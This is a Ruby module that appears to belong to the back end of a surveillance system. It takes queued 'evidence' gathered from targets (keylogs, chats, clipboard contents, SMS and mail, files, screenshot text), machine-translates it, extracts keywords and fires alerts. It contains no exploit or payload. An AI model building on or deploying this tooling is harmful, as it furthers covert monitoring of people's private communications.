#
# TRANSLATE processing module
#
# the evidence to be processed are queued by the workers
#

require_relative 'sdl'

require 'rcs-common/trace'
require 'rcs-common/fixnum'
require 'rcs-common/sanitize'
require 'fileutils'

module RCS
module Translate

class Processor
  extend RCS::Tracer

  def self.run
    trace :info, "TRANSLATE ready to go..."

    # infinite processing loop
    loop do
      # get the first entry from the queue and mark it as processed to avoid
      # conflicts with multiple processors
      if (queued = TransQueue.get_queued)
        entry = queued.first
        count = queued.last
        trace :info, "#{count} evidence to be processed in queue"
        process entry
        sleep 1
      else
        #trace :debug, "Nothing to do, waiting..."
        sleep 1
      end
    end
  rescue Exception => e
    trace :error, "Thread error: #{e.message}"
    trace :fatal, "EXCEPTION: [#{e.class}] " << e.backtrace.join("\n")
    retry
  end


  def self.process(entry)
    ev = Evidence.target(entry['target_id']).find(entry['evidence_id'])

    ev.data[:tr] = "TRANS_IN_PROGRESS"
    ev.save

    start = Time.now

    temp = RCS::DB::Config.instance.temp(ev[:_id].to_s)
    output = temp + '.trans'

    # dump the test to a file
    dump_to_file(entry['target_id'], ev, temp)
    size = File.size(temp)

    # invoke the translation on the temp file and get the result
    if SDL.translate(temp, output)
      raise "output file not found" unless File.exist?(output)
    else
      raise "unable to process"
    end

    FileUtils.rm_rf temp

    if File.exist?(output)
      translated_text = File.open(output, 'r') {|f| f.read}
      FileUtils.rm_rf output
    else
      raise "no output file"
    end

    # update the evidence with the new text
    ev.data[:tr] = translated_text
    ev[:kw] += translated_text.keywords

    # make them unique to remove duplicate in case of "no translation"
    ev[:kw].uniq!

    ev.save

    trace :info, "Evidence #{ev[:type]} processed in #{Time.now - start} seconds - text #{size.to_s_bytes} -> tr #{ev.data[:tr].size.to_s_bytes}"

    # check if there are matching alerts for this evidence
    RCS::DB::Alerting.new_evidence(ev)

  rescue Mongoid::Errors::DocumentNotFound
    # the evidence is not in the db anymore, ignore
  rescue Exception => e
    trace :error, "Cannot process evidence: #{e.class} #{e.message}"
    trace :error, e.backtrace.join("\n")
    ev.data[:tr] = "TRANS_ERROR"
    ev.save
  end

  def self.dump_to_file(target, evidence, file)
    content = ''

    trace :debug, "Extracting evidence #{evidence[:type]} to #{file}"

    case evidence[:type]
      when 'keylog'
        content = evidence[:data]['content']
      when 'chat'
        content = evidence[:data]['content']
      when 'clipboard'
        content = evidence[:data]['content']
      when 'message'
        if evidence[:data]['type'] == :mail
          # EML format not supported yet...
          #file = RCS::DB::GridFS.get evidence[:data]['_grid'], target
          #content = file.read

          # take the parsed body
          content = evidence[:data]['body']
          content = content.strip_html_tags
        else
          # sms and mms
          content = evidence[:data]['content']
        end
      when 'file'
        #grid_file = RCS::DB::GridFS.get evidence[:data]['_grid'], target
        #content = grid_file.read
        # take the parsed body
        content = evidence[:data]['body']
      when 'screenshot'
        content = evidence[:data]['body']
      else
        raise 'unknown format'
    end

    raise "no content" unless content

    File.open(file, 'w') {|f| f.write content}
  end

end

end #Translate::
end #RCS::